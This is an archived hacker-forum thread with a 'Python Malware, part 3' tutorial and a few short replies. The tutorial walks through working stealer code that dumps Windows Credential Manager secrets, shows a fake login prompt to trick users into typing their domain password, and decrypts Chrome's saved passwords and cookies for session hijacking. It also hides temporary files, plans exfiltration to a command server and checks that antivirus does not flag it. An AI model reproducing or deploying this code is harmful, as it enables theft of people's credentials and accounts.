<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Malware writing - Python Malware, part 3: Stealing credentials and cookies - Malware - 0x00sec - The Home of the Hacker</title>
<meta name="description" content="Keylogging and clipboard monitoring are very useful and probably all we need to capture credentials easily. That said, there might be already saved credentials on the system that we also want to recover. In part 3, we‚Äôll&amp;hellip;">
<meta name="generator" content="Discourse 3.1.0.beta6 - https://github.com/discourse/discourse version 80a1709965fa59da824b2e3392976fc6fc898f80">
<link rel="icon" type="image/png" href="../../uploads/default/optimized/2X/3/30c4e7d76acf879a124fdfe4d8d126afe628c189_2_32x32.png">
<link rel="apple-touch-icon" type="image/png" href="../../uploads/default/optimized/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e_2_180x180.png">
<meta name="theme-color" media="all" content="#171616">
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, user-scalable=yes, viewport-fit=cover">
<link rel="canonical" href="12099.html" />
<link rel="search" type="application/opensearchdescription+xml" href="../../opensearch.xml" title="0x00sec - The Home of the Hacker Search">
<link href="../../stylesheets/color_definitions_0x00sec-v2_15_57_a5ef387651921c3e4c7aa1108536015ba8299efb.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" class="light-scheme" />
<link href="../../stylesheets/desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop" />
<link href="../../stylesheets/chat_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="chat" />
<link href="../../stylesheets/discourse-details_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-details" />
<link href="../../stylesheets/discourse-lazy-videos_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-lazy-videos" />
<link href="../../stylesheets/discourse-local-dates_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-local-dates" />
<link href="../../stylesheets/discourse-narrative-bot_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-narrative-bot" />
<link href="../../stylesheets/discourse-presence_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-presence" />
<link href="../../stylesheets/discourse-spoiler-alert_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-spoiler-alert" />
<link href="../../stylesheets/docker_manager_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="docker_manager" />
<link href="../../stylesheets/poll_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="poll" />
<link href="../../stylesheets/chat_desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="chat_desktop" />
<link href="../../stylesheets/poll_desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="poll_desktop" />
<link href="../../stylesheets/desktop_theme_46_f36ade55bf80933494fe3b5fab518f477de3bd4e.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop_theme" data-theme-id="46" data-theme-name="header links v2" />
<link href="../../stylesheets/desktop_theme_57_8c0e890a61cdb4c5833a9f9c96664ed164e7d645.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop_theme" data-theme-id="57" data-theme-name="0x00sec-v2" />
<link rel="stylesheet" href="https://s3.amazonaws.com/0x00sec/monokai-sublime.css">
<script src="https://s3.amazonaws.com/0x00sec/highlight.pack.js"></script>
<link rel="preload" href="../../theme-javascripts/440fd21108f5ba9e5dfe06cca9fc842569d5a874.js%3F__ws=0x00sec.org" as="script">
<script defer src="../../theme-javascripts/440fd21108f5ba9e5dfe06cca9fc842569d5a874.js%3F__ws=0x00sec.org" data-theme-id="40"></script>
<link rel="alternate nofollow" type="application/rss+xml" title="RSS feed of &#39;Malware writing - Python Malware, part 3: Stealing credentials and cookies&#39;" href="12099.rss" />
<meta property="og:site_name" content="0x00sec - The Home of the Hacker" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary" />
<meta name="twitter:image" content="https://0x00sec.s3.amazonaws.com/original/2X/b/b89ead5ed2c16c042071f904abf43ab48f092b08.png" />
<meta property="og:image" content="https://0x00sec.s3.amazonaws.com/original/2X/b/b89ead5ed2c16c042071f904abf43ab48f092b08.png" />
<meta property="og:url" content="https://0x00sec.org/t/malware-writing-python-malware-part-3-stealing-credentials-and-cookies/12099" />
<meta name="twitter:url" content="https://0x00sec.org/t/malware-writing-python-malware-part-3-stealing-credentials-and-cookies/12099" />
<meta property="og:title" content="Malware writing - Python Malware, part 3: Stealing credentials and cookies" />
<meta name="twitter:title" content="Malware writing - Python Malware, part 3: Stealing credentials and cookies" />
<meta property="og:description" content="Keylogging and clipboard monitoring are very useful and probably all we need to capture credentials easily. That said, there might be already saved credentials on the system that we also want to recover. In part 3, we‚Äôll cover some useful and basic techniques to steal credentials and cookies with standard user privileges. This time instead of writing something painfully long and complex with ctypes, we‚Äôll use pywin32 which is a wrapper for the WinAPI. To install it, simply use the pip install py..." />
<meta name="twitter:description" content="Keylogging and clipboard monitoring are very useful and probably all we need to capture credentials easily. That said, there might be already saved credentials on the system that we also want to recover. In part 3, we‚Äôll cover some useful and basic techniques to steal credentials and cookies with standard user privileges. This time instead of writing something painfully long and complex with ctypes, we‚Äôll use pywin32 which is a wrapper for the WinAPI. To install it, simply use the pip install py..." />
<meta property="og:article:section" content="Malware" />
<meta property="og:article:section:color" content="F7941D" />
<meta property="og:article:tag" content="programming" />
<meta property="og:article:tag" content="pentesting" />
<meta property="og:article:tag" content="hacking" />
<meta property="og:article:tag" content="python" />
<meta name="twitter:label1" value="Reading time" />
<meta name="twitter:data1" value="4 mins üïë" />
<meta name="twitter:label2" value="Likes" />
<meta name="twitter:data2" value="26 ‚ù§" />
<meta property="article:published_time" content="2019-03-08T01:53:52+00:00" />
<meta property="og:ignore_canonical" content="true" />
</head>
<body class="crawler ">
<div id="top-navbar" class="container">
<span id="top-navbar-links" style="display:none;">

<a href="https://init.0x00sec.org" class="dow-menu">Init</a>
<a href="https://discord.gg/c6BHVfn" class="dow-menu">Discord</a>
<a href="https://init.0x00sec.org/?partners" class="dow-menu">Partners</a>
</span>
</div>
<header>
<a href="../../index.html">
0x00sec - The Home of the Hacker
</a>
</header>
<div id="main-outlet" class="wrap" role="main">
<div id="topic-title">
<h1>
<a href="12099.html">Malware writing - Python Malware, part 3: Stealing credentials and cookies</a>
</h1>
<div class="topic-category" itemscope itemtype="http://schema.org/BreadcrumbList">
<span itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
<a href="../../c/malware.html" class="badge-wrapper bullet" itemprop="item">
<span class="badge-category-bg" style="background-color: #F7941D"></span>
<span class="badge-category clear-badge">
<span class="category-name" itemprop="name">Malware</span>
</span>
</a>
<meta itemprop="position" content="1" />
</span>
</div>
<div class="topic-category">
<div class="discourse-tags list-tags">
<a href="../../tag/programming.html" class="discourse-tag" rel="tag">programming</a>,
<a href="../../tag/pentesting.html" class="discourse-tag" rel="tag">pentesting</a>,
<a href="../../tag/hacking.html" class="discourse-tag" rel="tag">hacking</a>,
<a href="../../tag/python.html" class="discourse-tag" rel="tag">python</a>
</div>
</div>
</div>
<div itemscope itemtype="http://schema.org/DiscussionForumPosting">
<meta itemprop="headline" content="Malware writing - Python Malware, part 3: Stealing credentials and cookies">
<meta itemprop="articleSection" content="Malware">
<meta itemprop="keywords" content="programming, pentesting, hacking, python">
<div itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
<meta itemprop="name" content="0x00sec - The Home of the Hacker">
<div itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
<meta itemprop="url" content="https://0x00sec.org/uploads/default/original/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e.png">
</div>
</div>
<div id="post_1" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/tr4cefl0w"><span itemprop="name">tr4cefl0w</span></a>
</span>
<link itemprop="mainEntityOfPage" href="12099.html">
<link itemprop="image" href="https://0x00sec.s3.amazonaws.com/original/2X/b/b89ead5ed2c16c042071f904abf43ab48f092b08.png">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2019-03-08T01:53:52Z" class="post-time">
March 8, 2019, 1:53am
</time>
<meta itemprop="dateModified" content="2019-03-08T10:33:52Z">
<span itemprop="position">1</span>
</span>
</div>
<div class="post" itemprop="articleBody">
<p>Keylogging and clipboard monitoring are very useful and probably all we need to capture credentials easily. That said, there might be already saved credentials on the system that we also want to recover. In part 3, we‚Äôll cover some useful and basic techniques to steal credentials and cookies with standard user privileges. This time instead of writing something painfully long and complex with <code>ctypes</code>, we‚Äôll use <code>pywin32</code> which is a wrapper for the WinAPI. To install it, simply use the <code>pip install pypiwin32</code> command.</p>
<p>We start by importing the packages and modules we‚Äôll need and create a constant to be used when calling some Credential Manager (also known as CredMan) related functions.</p>
<pre><code class="lang-auto">import os
import io
import sys
import sqlite3
import json
import shutil
import win32cred
import win32crypt
import win32api
import win32con
import pywintypes

CRED_TYPE_GENERIC = win32cred.CRED_TYPE_GENERIC
</code></pre>
<p>Then, we‚Äôll create a new class called <code>credentials</code>. It won‚Äôt need any constructor, it‚Äôs simply to differentiate the credentials methods from the cookies methods. Within that class, we‚Äôll start with the <code>dump_credsman_generic()</code> method.</p>
<h2>Dumping generic credentials from Windows Credential Manager</h2>
<p>That function is meant to dump all generic credentials stored in the Credential Manager. Generic credentials are non-domain type credentials. For example, if you use Git on Windows and you authenticate to GitHub, Bitbucket, Gitlab, etc. the credentials are stored in CredMan. We cannot read domain credentials (<code>CRED_TYPE_DOMAIN</code>) without interacting with LSASS which we want to avoid (source: <a href="https://docs.microsoft.com/en-us/windows/desktop/secauthn/kinds-of-credentials" rel="noopener nofollow ugc">https://docs.microsoft.com/en-us/windows/desktop/secauthn/kinds-of-credentials</a>).</p>
<p>We start by importing the functions we‚Äôll need to enumerate and read the credentials.</p>
<pre><code class="lang-auto">    def dump_credsman_generic():
        
        CredEnumerate = win32cred.CredEnumerate
        CredRead = win32cred.CredRead
</code></pre>
<p>Then, we enumerate the credentials stored in credman and put them in the <code>creds</code> variable, which is a tuple.</p>
<pre><code class="lang-auto">        try:
            creds = CredEnumerate(None, 0)  # Enumerate credentials
        except Exception:              		# Avoid crashing on any exception
            pass
</code></pre>
<p>Now we want to iterate through each credential set (named package here because <em>set</em> is a Python keyword) and add them as individual elements to the <code>credentials</code> list so it‚Äôs easier to work with.</p>
<pre><code class="lang-auto">        credentials = []

        for package in creds:
            try:
                target = package['TargetName']
                creds = CredRead(target, CRED_TYPE_GENERIC)
                credentials.append(creds)
            except pywintypes.error:
                pass
</code></pre>
<p>You might notice two things here. First we‚Äôre using a list instead of a dictionary. That‚Äôs because the credential blob is in hexadecimal. In Python, octal and hexadecimal formats are not supported by JSON so we use a list as workaround.</p>
<p>The second thing is that we use <code>CredRead()</code>, which returns the same data as CredEnumerate(). The difference here is that CredRead() is used to read a specific package (or set) of credentials while CredEnumerate() just returns everything. We could simply loop through the <code>creds</code> variable, but from what I‚Äôve seen reading some C code using CredMan, <code>CredRead()</code> is the clean way to do it (don‚Äôt hesitate to correct me if I‚Äôm wrong).</p>
<p>Now it‚Äôs time to create an in-memory text stream (to avoid writing a file on disk) that we can later send to our not-yet-built C2.</p>
<pre><code class="lang-auto">        credman_creds = io.StringIO() # In-memory text stream

        for cred in credentials:

            service = cred['TargetName']
            username = cred['UserName']
            password = cred['CredentialBlob'].decode()

            credman_creds.write('Service: ' + str(service) + '\n')
            credman_creds.write('Username: ' + str(username) + '\n')
            credman_creds.write('Password: ' + str(password) + '\n')
            credman_creds.write('\n')

        return credman_creds.getvalue()
</code></pre>
<p>We first start with creating the <code>credman_creds</code> text stream that will hold the service, username and password. We then iterate through the <code>credentials</code> variable and write the data we want to the text stream, making sure we decode the credential blob so we get the password in plain-text. When done, we simply return the data contained in the text stream.</p>
<p>We can test by editing our <code>main.py</code> file with the following:</p>
<pre><code class="lang-auto">import stealer

if __name__ == '__main__':
    
    credstealer = stealer.credentials
    print(credstealer.dump_credsman_generic())
</code></pre>
<p>The result:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/b/b89ead5ed2c16c042071f904abf43ab48f092b08.png" alt="10103" data-base62-sha1="qldOM49djnUBTp8zhYmEbU7OwNa" width="690" height="247"></p>
<p>As you can see above, if there are git keys or passwords stored in there, you can dump them which could give you access to source code that isn‚Äôt public.The <code>Microsoft_OC1</code> TargetName is actually the password for a Skype for Business account, which is the same as the domain password of the user. If the user is also running Outlook 2016, you‚Äôll likely find his domain credentials under <code>MicrosoftOffice16_Data:SSPI:&lt;account&gt;</code>.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/a/acf4dd9e71829ff1cd451c298a9e53b067352a60.png" alt="14158" data-base62-sha1="oG2KkspudeuJ0qROZuKVbHpBEuQ" width="515" height="58"></p>
<h2>Asking for domain credentials with a prompt</h2>
<p>As said previously, it‚Äôs common nowadays for penetration testers to use Mimikatz to dump credentials from LSASS. The problem is that it gets caught immediately by most EDR and next-gen AVs. If you haven‚Äôt been lucky with the keylogging and the credential manager to find the user‚Äôs domain password, about just asking for it?</p>
<p>We can try to do some social engineering and trick the user to give us his domain credentials using the <code>CredUIPromptForCredentials()</code> function to display a dialog box asking for them. The function does exactly that and returns the password entered as plain text.</p>
<pre><code class="lang-auto">        CredUIPromptForCredentials = win32cred.CredUIPromptForCredentials

        creds = []

        try:
            creds = CredUIPromptForCredentials(os.environ['userdomain'], 0, os.environ['username'], None, True, CRED_TYPE_GENERIC, {})
        except Exception:   # Avoid crashing on any exception
            pass
        return creds
</code></pre>
<p>Here we use the environment variable <code>userdomain</code> to display the target. If the user is on the domain <code>CONTOSO.LOCAL</code>, the prompt will ask to enter credentials for the user on domain <code>CONTOSO-LOCAL</code>, which is the name returned by <code>userdomain</code>.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/3/36aa10c2b3040fafafbe0484a5fc362cc43c57ae.png" alt="23629" data-base62-sha1="7NA97343r0Bx016sT4olSS33gp8" width="319" height="285"></p>
<p>As you can see below, the method returns the credentials entered in plain text.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/4/4623170787369b237a144427ac4347fe4c7f66aa.png" alt="20184" data-base62-sha1="a0sBnf8qrOZOTr0tD0VAysVIepQ" width="347" height="21"></p>
<h2>Dumping passwords saved in Chrome</h2>
<p>Chrome is the browser with the most marketshare so it will naturally be a prime target. Every single piece of stealer malware I‚Äôve seen steals passwords from Chrome because, to be honest, it‚Äôs really easy. If you don‚Äôt set a master password when saving your credentials, the encrypted blob in the Login Data database can be decrypted with the <code>CryptUnprotectData</code> as long as its done in the current user context. This means that you can‚Äôt just grab the database and open it on a different machine with a different user.</p>
<p>Chrome passwords are stored in a SQLite database called <code>Login Data</code> located in the <code>%localappdata%\Google\Chrome\User Data\Default\</code> directory. The structure of the database can be seen here using DB Browser, an open source database tool for SQLite.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/d/d51611405db5ef7832d1bd382b4e8954fe0815f2.png" alt="21969" data-base62-sha1="up2YMwXLPtyRUlROOA7npWL2u0q" width="690" height="399"></p>
<p>There are three relevant fields here that we‚Äôll want to query for: <code>action_urls</code>, <code>username_value</code> and <code>password_value</code>. The field <code>password_value</code> contains an encrypted blob that we will decrypt with the code below.</p>
<p>First, we want to make a local copy of the database file, otherwise, if Chrome is currently running, it will have a handle on it and the database will be locked. Alternatively, we could use WMI to query the running processes and wait for Chrome<br>
to stop running but that could take a long time.</p>
<pre><code class="lang-auto">        try:
            login_data = os.environ['localappdata'] + '\\Google\\Chrome\\User Data\\Default\\Login Data'
            shutil.copy2(login_data, './Login Data') # Copy DB to current dir
            win32api.SetFileAttributes('./Login Data', win32con.FILE_ATTRIBUTE_HIDDEN) # Make file invisible during operation
        except Exception:
            pass

	chrome_credentials = io.StringIO() # In-memory text stream
</code></pre>
<p>We use basic exception handling to avoid crashing the program if one occurs. If you need to troubleshoot issues with <code>sqlite3</code>, use <code>sqlite3.Error</code> to get the details. Then we create a in-memory text stream that will contain the dumped credentials to avoid writing a file on disk.</p>
<p>Now, we have to open the local copy of the <code>Login Data</code> database with the sqlite3 library and query for the credentials that were saved by the user.</p>
<pre><code class="lang-auto">        try:
            conn = sqlite3.connect('./Login Data', )                                        # Connect to database
            cursor = conn.cursor()                                                          # Create a cursor to fetch the data
            cursor.execute('SELECT action_url, username_value, password_value FROM logins') # Run the query
            results = cursor.fetchall()                                                     # Get the results
            conn.close()                                                                    # Close the database file so it's not locked by the process
            os.remove('Login Data')                                                         # Delete file when done as the results are in a variable.
</code></pre>
<p>This is an easy and simple example on how to query a SQLite database with Python but it can be very useful. Later, when dealing with Chrome cookies, we‚Äôll also update the data in the database. Now that our variable <code>results</code> contains the results of the query, which are the urls, usernames and encrypted passwords, we can loop through those results and decrypt the passwords with the WinAPI function <code>CryptUnprotectData</code> and append them to our in-memory text stream.</p>
<pre><code class="lang-auto">
            for action_url, username_value, password_value in results:        							                                 
                password = win32crypt.CryptUnprotectData(password_value, None, None, None, 0)[1] # Decrypt the password with CryptUnprotectData
                if password:                                                                		 # Write credentials to text stream in memory
                    chrome_credentials.write('URL: ' + action_url + '\n')
                    chrome_credentials.write('Username: ' + username_value + '\n')
                    chrome_credentials.write('Password: ' + str(password) + '\n')
                    chrome_credentials.write('\n')
            return chrome_credentials.getvalue()                                            		 # Return content of the text stream

        except sqlite3.OperationalError as e: # Simple exception handling to avoid crashing
            print(e)                          # when opening the Login Data database
            pass

        except Exception as e:                # Avoid crashing for any other exception
            print(e)
            pass
</code></pre>
<p>We use <code>CryptUnprotectData</code> to decrypt the blob because Chrome on Windows uses the <code>CryptProtectData</code> WinAPI function to encrypt them (reference: <a href="https://chromium.googlesource.com/chromium/chromium/+/master/chrome/browser/password_manager/encryptor_win.cc" rel="noopener nofollow ugc">https://chromium.googlesource.com/chromium/chromium/+/master/chrome/browser/password_manager/encryptor_win.cc</a>). As you can read on MSDN regarding <code>CryptProtectData</code>, <em>The CryptProtectData function performs encryption on the data in a DATA_BLOB structure. Typically, only a user with the same logon credential as the user who encrypted the data can decrypt the data. In addition, the encryption and decryption usually must be done on the same computer. For information about exceptions, see Remarks.</em> This is why we need to decrypt the data locally and in the same user context.</p>
<p>Now, we can test the method by modifying our <code>main.py</code> to call it.</p>
<pre><code class="lang-auto">import stealer

if __name__ == '__main__':

    credstealer = stealer.credentials
    print(credstealer.dump_chrome_passwords())
</code></pre>
<p>Then we run <code>main.py</code> and‚Ä¶</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/f/f157cb5a0f2ad4603acef5a41056fb0de944dfcd.png" alt="8401" data-base62-sha1="yr1atdkuc3TsALbNmVjOISR8JjL" width="435" height="215"></p>
<h2>Stealing Chrome cookies</h2>
<p>Chrome cookies are managed the same way as passwords. They are stored in a database file called <code>Cookies</code> and are encrypted with <code>CryptProtectData</code>. So the decryption will be done the same way. However, there are two differences here. First, we rewrite the data inside the database with the decrypted cookies instead of writing them in a file. Second, this we steal the whole database file with the decrypted cookies. This database can then be uploaded to a remote server and used for authenticating in the sites visited by the user if the session has not expired on the server side or if the user has not signed-out.</p>
<pre><code class="lang-auto">        login_data = os.environ['localappdata'] + '\\Google\\Chrome\\User Data\\Default\\Cookies' # Path to Cookies database file
        shutil.copy2(login_data, './Cookies')                                                     # Copy DB to current dir
        win32api.SetFileAttributes('./Cookies', win32con.FILE_ATTRIBUTE_HIDDEN)                   # Make file invisible during operation

        try:
            conn = sqlite3.connect('./Cookies')                                                   # Connect to database
            cursor = conn.cursor()
            cursor.execute('SELECT host_key, name, value, encrypted_value FROM cookies')          # Run the query
            results = cursor.fetchall()                                                           # Get the results

            # Decrypt the cookie blobs
            for host_key, name, value, encrypted_value in results:
                decrypted_value = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode()
            
                # Updating the database with decrypted values.             
                cursor.execute("UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999,\
                                is_persistent = 1, is_secure = 0 WHERE host_key = ? AND name = ?",(decrypted_value, host_key, name));

            conn.commit()   # Save the changes
            conn.close()    # Close the database file so it's not locked by the process

        except Exception as e:  # Avoid crashes from exceptions if any occurs.
            print(e)
            pass

    # Then, after this function is called, we would exfiltrate the database and delete it.
</code></pre>
<p>Don‚Äôt forget that using cookies by themselves however does not always work. Sessions might be tied to additional information such as user-agent, IP address, referrer, etc. so we have to gather as much information as we can on the user and the host first. This will be covered in part 4 where we‚Äôll build a simple module to collect system information and set up a command and control server using GitHub so we can hide the traffic in plain sight.</p>
<p>Now let‚Äôs see if building an executable that dumps credman and Chrome passwords triggers detections‚Ä¶</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/a/abaedf4b2a9d4efb5aeb85306e28f969b7844ed0.png" alt="24086" data-base62-sha1="ouMjbHdEIWlcuJvODce32A6vkDC" width="690" height="155"></p>
<aside class="onebox allowlistedgeneric">
<header class="source">
<img src="https://0x00sec.s3.amazonaws.com/original/3X/d/9/d94764657d0d75c8dc3b4c65d15a3a10d3418817.png" class="site-icon" width="100" height="89">
<a href="https://www.virustotal.com/gui/" target="_blank" rel="noopener nofollow ugc">virustotal.com</a>
</header>
<article class="onebox-body">
<img "https://0x00sec.org/t/malware-writing-python-malware-part-3-stealing-credentials-and-cookies/src" class="thumbnail" width height>
<h3><a href="https://www.virustotal.com/gui/" target="_blank" rel="noopener nofollow ugc">VirusTotal</a></h3>
</article>
<div class="onebox-metadata">
</div>
<div style="clear: both"></div>
</aside>
<p>Nope. But to be fair, it doesn‚Äôt do much right now. That said, credential dumping in user space with standard privilege rarely gets detected. That‚Äôs because, even for heuristics, it‚Äôs hard to determine if access to credential manager or not is for malicious purpose as many legitimate applications use it to ‚Äúsecurely‚Äù store credentials. If you don‚Äôt try to escalate privileges and dump LSASS, it‚Äôs unlikely that you‚Äôll be detected.</p>
<p>The full code with useful comments can be found here:<br>
</p><aside class="onebox allowlistedgeneric">
<header class="source">
<img src="https://github.githubassets.com/favicons/favicon.svg" class="site-icon" width="32" height="32">
<a href="https://github.com/tr4cefl0w/0x00sec/tree/master/python-malware" target="_blank" rel="noopener nofollow ugc">GitHub</a>
</header>
<article class="onebox-body">
<img src="https://0x00sec.s3.amazonaws.com/original/2X/b/b003ac66c76e9a6fa90ab13d548fe240043fb874.png" class="thumbnail" width height>
<h3><a href="https://github.com/tr4cefl0w/0x00sec/tree/master/python-malware" target="_blank" rel="noopener nofollow ugc">tr4cefl0w/0x00sec</a></h3>
<p>Repository for code and snippets posted on 0x00sec.org - tr4cefl0w/0x00sec</p>
</article>
<div class="onebox-metadata">
</div>
<div style="clear: both"></div>
</aside>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="23" />
<span class="post-likes">23 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
<div class="crawler-linkback-list" itemscope itemtype="http://schema.org/ItemList">
<div itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
<a itemprop="url" href="../0x00sec-2019-year-end-review-year-0x04/18391.html">0x00sec 2019 Year End Review - Year 0x04</a>
<meta itemprop="position" content="5">
</div>
</div>
</div>
<div id="post_2" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/check-sec"><span itemprop="name">check-sec</span></a>
</span>
<link itemprop="mainEntityOfPage" href="12099.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2019-03-09T10:48:10Z" class="post-time">
March 9, 2019, 10:48am
</time>
<meta itemprop="dateModified" content="2019-03-09T10:48:10Z">
<span itemprop="position">2</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Errors out saying: local variable creds is referenced before assignment !<br>
My code is exact as in the article;<br>
This is pertaining to the generic dumping oly‚Ä¶Not the latter half of the article <img src="../../images/emoji/twitter/slight_smile.png%3Fv=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_3" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/tr4cefl0w"><span itemprop="name">tr4cefl0w</span></a>
</span>
<link itemprop="mainEntityOfPage" href="12099.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2019-03-09T18:42:33Z" class="post-time">
March 9, 2019, 6:42pm
</time>
<meta itemprop="dateModified" content="2019-03-09T18:42:33Z">
<span itemprop="position">3</span>
</span>
</div>
<div class="post" itemprop="text">
<p>I don‚Äôt have that error. What version of Python are you using? Are you running it with PyInstaller? If so, show the full debug output. My guess is that you need an hidden import which you have to compile it with, probably win32timezone.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_4" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/xXxH4CK0RxXx"><span itemprop="name">xXxH4CK0RxXx</span></a>
(Lulumichen)
</span>
<link itemprop="mainEntityOfPage" href="12099.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2019-03-09T21:47:42Z" class="post-time">
March 9, 2019, 9:47pm
</time>
<meta itemprop="dateModified" content="2019-03-09T21:47:42Z">
<span itemprop="position">4</span>
</span>
</div>
<div class="post" itemprop="text">
<p>thanks a lot <a class="mention" href="https://0x00sec.org/u/tr4cefl0w">@tr4cefl0w</a> these are really great in depth tutorials you‚Äôre making.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="1" />
<span class="post-likes">1 Like</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_5" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/tr4cefl0w"><span itemprop="name">tr4cefl0w</span></a>
</span>
<link itemprop="mainEntityOfPage" href="12099.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2019-03-09T22:09:41Z" class="post-time">
March 9, 2019, 10:09pm
</time>
<meta itemprop="dateModified" content="2019-03-09T22:09:41Z">
<span itemprop="position">5</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Thanks! I‚Äôm trying to make them easy to understand for beginners. They could be even more in depth and painfully long if we were doing everything with ctypes <img src="../../images/emoji/twitter/joy.png%3Fv=9" title=":joy:" class="emoji" alt=":joy:"></p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_6" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/xXxH4CK0RxXx"><span itemprop="name">xXxH4CK0RxXx</span></a>
(Lulumichen)
</span>
<link itemprop="mainEntityOfPage" href="12099.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2019-03-09T23:49:17Z" class="post-time">
March 9, 2019, 11:49pm
</time>
